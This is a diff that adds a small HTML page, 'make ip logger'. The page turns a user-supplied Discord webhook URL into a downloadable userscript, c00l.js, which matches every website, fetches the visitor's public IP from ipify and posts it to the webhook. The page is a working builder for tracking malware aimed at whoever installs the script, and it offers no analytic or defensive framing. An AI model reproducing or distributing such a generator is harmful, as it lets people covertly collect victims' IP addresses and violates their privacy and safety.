@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>c00lskid</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        h1 {
+            background-color: #ff0000;
+            padding: 10px;
+            text-align: center;
+        }
+        form {
+            padding: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #ff0000;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+        }
+        a {
+            display: block;
+            background-color: #ff0000;
+            color: #fff;
+            padding: 10px;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>make ip logger</h1>
+    <form id="scriptForm">
+        <label for="webhookUrl">Discord Webhook URL:</label>
+        <input type="text" id="webhookUrl" name="webhookUrl" required>
+        <br>
+        <button type="button" onclick="generateScript()">CREATE</button>
+        <a id="downloadLink" style="display:none">Download c00l.js</a>
+    </form>
+    <script>
+        function generateScript() {
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            if (!webhookUrl) {
+                alert('Invalid URL');
+                return;
+            }
+            const scriptContent = `
+// ==UserScript==
+// @name         c00l logger
+// @namespace    c00lkidd team
+// @version      v1.0
+// @description  IP Logger
+// @author       c00lskid
+// @match        *://*/*
+// @grant        none
+// ==/UserScript==
+
+(async function() {
+    const ipAddress = await fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => data.ip);
+    const webhookURL = '${webhookUrl}';
+    const payload = {
+        content: \`IP: \${ipAddress}\`,
+    };
+    await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    });
+})();
+`;
+            const blob = new Blob([scriptContent], { type: 'text/javascript' });
+            const downloadLink = document.getElementById('downloadLink');
+            downloadLink.href = URL.createObjectURL(blob);
+            downloadLink.download = 'c00l.js';
+            downloadLink.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
